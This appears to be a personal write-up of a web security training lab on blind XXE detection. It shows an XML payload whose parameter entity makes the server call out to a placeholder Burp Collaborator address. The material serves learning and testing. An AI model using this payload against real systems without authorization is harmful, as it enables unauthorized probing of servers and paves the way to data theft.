Blind XXE with Out-of-Band Interaction via Parameter Entities

**Category**: XXE
**Difficulty**: Practitioner  

---

## Overview / What I Learned

- This lab demonstrates a blind XXE vulnerability where normal external entities are blocked, but parameter entities can be used to bypass restrictions.
- The application parses XML input for the "Check stock" feature but does not display unexpected values directly.
- By using parameter entities in the XML DOCTYPE, it is possible to trigger out-of-band DNS and HTTP requests.
- Burp Collaborator is used to detect these interactions and confirm the vulnerability.

## Exploit Steps / Attack Methodology

### 1. Intercept the Request
- Used Burp Suite to intercept the POST request triggered by clicking "Check stock" on a product page.
- The request body contains XML data with product and store IDs.

### 2. Modify XML Payload
- Added a DOCTYPE declaration with a parameter entity referencing a Burp Collaborator payload.
- Structure added before the root element `<stockCheck>`:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://collaborator">
  %xxe;
]>
Replaced collaborator with the Collaborator URL 

3. Send Modified Request
Sent the modified XML with parameter entity definitions.

The parser resolved the parameter entity, causing a DNS and HTTP request to the Collaborator server.

4. Verify Interaction
Checked the Collaborator tab and clicked "Poll now" to view DNS/HTTP callbacks.

The presence of callbacks confirmed the vulnerability and solved the lab.
